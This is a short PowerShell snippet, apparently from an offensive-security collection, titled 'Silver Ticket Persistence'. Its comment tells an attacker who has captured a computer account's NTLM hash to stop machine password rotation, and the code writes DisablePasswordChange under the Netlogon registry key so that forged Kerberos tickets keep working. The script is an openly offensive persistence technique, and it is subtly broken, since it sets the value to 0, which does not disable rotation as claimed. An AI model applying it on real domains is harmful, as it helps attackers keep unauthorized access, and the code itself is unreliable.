# Silver Ticket Persistence
# https://adsecurity.org/?p=2011
# Once the local computer account ntlm hash is captured, disable the rotation of the password for persistence.

$RegistryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters"
$Name = "DisablePasswordChange"
$Value = "0"

New-ItemProperty -Path $RegistryPath -Name $Name -Value $Value -PropertyType DWORD -Force
